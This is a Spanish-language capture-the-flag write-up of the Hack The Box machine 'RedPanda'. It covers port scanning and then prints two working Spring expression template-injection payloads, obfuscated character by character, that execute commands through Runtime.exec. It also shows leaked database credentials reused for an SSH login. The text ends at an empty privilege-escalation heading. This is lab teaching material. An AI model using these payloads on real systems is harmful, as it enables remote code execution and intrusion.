---
title: Red Panda Writeup
published: true
---



Hoy resolveremos la maquina retirada "RedPanda" es una maquina de hack the box de dificultad facil.


![RedPanda](https://user-images.githubusercontent.com/109216235/185928422-3e828dfa-543c-4e4f-b1e0-c1a2fdced03b.png)


# [](#header-1) Enumeración


Empezamos escaneando los puertos de la maquina con nmap


```nmap
nmap -sC -sV -T4 10.10.11.170
Nmap scan report for 10.10.11.170
PORT      STATE SERVICE
22/tcp    open  ssh
8080/tcp  open  http-proxy

```

Con este analisis podemos ver que tiene el puerto ssh y el puerto http abierto. Esto nos hace enteder que esta maquina tiene un puerto para acceder de forma remota y un puerto para poder acceder en internet


![imagen](https://user-images.githubusercontent.com/109216235/185764843-feace9a3-e2e5-43e9-a1c4-3271e7620de2.png)


# [](#header-2) Vulnerabilidad


Dentro de la pagina vemos un buscador y probando payloads vemos que nos bloquea el caracter $


![imagen](https://user-images.githubusercontent.com/109216235/185764827-93488e1f-c4de-4f1c-b9fb-d89c58276616.png)


Probamos con el caracter * y vemos que si que nos deja


![imagen](https://user-images.githubusercontent.com/109216235/185764892-8e6c1201-4efe-42bd-a6c4-26852677a38e.png)


Sabiendo esto usando esta herramienta de VikasVarshney https://github.com/VikasVarshney/ssti-payload podemos crear un payload que nos permita ejecutar comandos en el buscador. Si ponemos este payload en el buscador conseguiremos la "user.txt".


```javascript
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
```

Utilizando la misma tecnica encontramos un archivo en esta ruta /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java Utilizando este payload 


```javascript
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97))).getInputStream())}
```

Y nos devuelve esto

```javascript
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
stmt.setString(1, "%" + query + "%");
```

Este output nos indica un posible usuario y una posible contraseña. Probando conseguimos acceder al ssh
```bash
ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: RedPandazRule
```

# [](#header-3) Escalada de privilegios

